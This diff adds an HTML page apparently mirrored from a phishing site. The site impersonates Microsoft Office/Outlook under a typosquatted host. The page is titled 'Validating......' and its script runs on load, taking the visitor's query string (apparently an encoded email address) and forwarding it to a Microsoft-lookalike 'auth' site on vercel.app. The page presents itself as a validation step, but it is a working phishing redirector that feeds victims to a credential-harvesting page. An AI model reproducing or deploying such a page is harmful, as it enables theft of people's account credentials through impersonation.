@@ -1,0 +1,40 @@
+<html>
+  <!--
+* PyWebCopy Engine [version 7.0.2]
+* Copyright 2020; Raja Tomar
+* File mirrored from [https://0ffice-servr-0utl00k-i6tr8.web.app/]
+* At UTC datetime: [2023-06-24 11:49:17.971180]
+--><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Validating......</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  </head>
+
+  <body>
+    <script>
+      function redirrectPage() {
+        var query = window.location.href;
+        console.log(query);
+        var res = query.split("?");
+        var data1 = res[0];
+        var data2 = res[1];
+        console.log(data1);
+        console.log(data2);
+
+        //realemailID = atob(data2);
+
+        if (data2) {
+          console.log("true");
+          window.location.href =
+            "https://organizations-microsoftfolders-auth.vercel.app/?sss=" + data2;
+        } else {
+          console.log("false");
+          window.location.href =
+            "https://organizations-microsoftfolders-auth.vercel.app/?sss=" + data2;
+        }
+      }
+      redirrectPage();
+    </script>
+  </body>
+</html>
